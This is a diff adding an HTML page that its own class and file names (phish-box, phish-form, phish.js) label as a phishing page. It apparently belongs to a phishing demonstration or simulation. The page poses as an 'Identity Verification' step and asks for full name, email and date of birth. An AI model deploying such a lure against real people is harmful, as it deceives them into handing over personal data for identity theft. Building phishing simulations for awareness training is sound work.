@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Identity Verification</title>
+<link rel="stylesheet" href="css/phish.css">
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-GWY0QNR095"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GWY0QNR095');
+</script>
+</head>
+<body>
+
+<div class="phish-box">
+  <h1>Identity Verification</h1>
+  <p class="desc">
+    For security reasons, please verify your identity to proceed.
+  </p>
+
+  <form id="phish-form">
+    <label>
+      Full Name  
+      <input type="text" placeholder="Your full legal name" required>
+    </label>
+
+    <label>
+      Email Address  
+      <input type="email" placeholder="example@mail.com" required>
+    </label>
+
+    <label>
+      Date of Birth  
+      <input type="date" required>
+    </label>
+
+    <button class="btn">Continue</button>
+  </form>
+
+  <p class="small-print">
+    Your information will be used for secure identification.
+  </p>
+</div>
+
+<script src="/js/phish.js"></script>
+</body>
+</html>
